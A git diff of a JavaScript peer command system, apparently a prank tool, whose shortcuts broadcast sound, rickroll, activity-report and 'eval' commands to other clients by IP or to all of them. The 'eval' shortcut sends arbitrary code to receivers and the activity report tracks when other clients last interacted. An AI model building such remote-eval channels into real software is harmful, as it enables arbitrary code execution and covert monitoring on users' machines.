@@ -2,14 +2,14 @@ function distribute_commands(command)
 {
     console.log("command to execute:", command);
     let invoker = command.invoker;
-    //QUEUE.push({"command":{"command_response": resp}})
-    // {"command":{"command": {} }
+
     if (command.snd)
     {
         sound_command_handler(command.snd, invoker)
     }
     if (command.send_last_interaction)
     {
+        console.log("interactin");
         get_my_last_interaction(invoker)
     }
     if (command.rickroll)
@@ -97,22 +97,22 @@ function get_my_last_interaction(invoker)
             minutes = Math.round(minutes%60);
         }
         let msg = `${hours===undefined?"0":hours}h : ${minutes===undefined?"0":minutes}m : ${seconds}s`;
-        format_and_send_response({"info": `client ${IP} interacted ${msg} ago!` }, invoker)
+
+        let r = format_and_send_response({"info": `client ${IP} interacted ${msg} ago!` }, invoker);
+        console.log("responding with", r);
     }
     else
     {
         format_and_send_response({"info": `client ${IP} haven't interacted yet` }, invoker)
     }
 
-
-
 }
 
-
-function command_response_handler(action)
+function command_response_handler(command)
 {
-    let client = action.client;
-    let response = action.command.command_response;
+    console.log("handling response", command);
+    let client = command.client;
+    let response = command.command_response;
 
     if (response.info)
     {
@@ -141,12 +141,16 @@ function format_and_send_command(command_object, receiverIP)
     return r;
 }
 
-function format_and_send_response(resp_info)
+function format_and_send_response(resp_info, invoker)
 {
-    let invoker = IP;
+
     // dont send response to self
     if (invoker === IP)
+    {
+        console.log("can not send to self");
         return;
+    }
+
 
     resp_info.invoker = invoker;
     let r = {"command_response":resp_info};
@@ -158,19 +162,25 @@ function format_and_send_response(resp_info)
 // some command shortcuts
 function exec(key, arg, rec)
 {
+    let receiver = rec===undefined?"all":rec;
     switch (key)
     {
         case "darude":
-            format_and_send_command({"snd":"darude"}, rec===undefined?"all":rec);
+            format_and_send_command({"snd":"darude"}, receiver);
             break;
         case "relax":
-            format_and_send_command({"snd":"relax"}, rec===undefined?"all":rec);
+            format_and_send_command({"snd":"relax"}, receiver);
             break;
         case "eval":
-            format_and_send_command({"eval":arg}, rec===undefined?"all":rec);
+            format_and_send_command({"eval":arg}, receiver);
             break;
         case "inter":
-            format_and_send_command({"send_last_interaction":"1"}, rec===undefined?"all":rec);
+            format_and_send_command({"send_last_interaction":"1"}, receiver);
+            break;
+        case "rickroll":
+            format_and_send_command({"rickroll":1}, receiver);
+            break;
+
     }
 
 }
